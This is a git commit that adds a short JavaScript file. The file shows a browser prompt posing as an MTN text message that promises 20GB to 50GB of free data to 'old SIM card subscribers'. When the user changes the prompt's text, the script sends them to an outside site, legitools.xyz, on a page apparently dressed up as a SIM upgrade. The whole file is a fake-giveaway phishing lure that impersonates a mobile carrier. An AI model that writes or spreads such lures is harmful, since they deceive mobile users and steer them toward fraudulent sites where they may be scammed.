2efaa391577e818c1ab039d3451a3af7afc7b61c
okpoz <okpoitidz@gmail.com>
2026-07-03 12:42:01 +0100

    Create mtnguinea-freedata.js

---
+++ mtnguinea-freedata.js
@@ -0,0 +1,5 @@
+var password = '50GB Free Data'
+password=prompt('MTN SMS: Congratulations Your Number is Eligible to receive 20GB - 50GB Free Data OLD SIM CARD SUBSCRIBERS REWARD, Kindly Press OK to ACTIVATE. ','50GB Free Data');
+if (password != '50GB Free Data') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
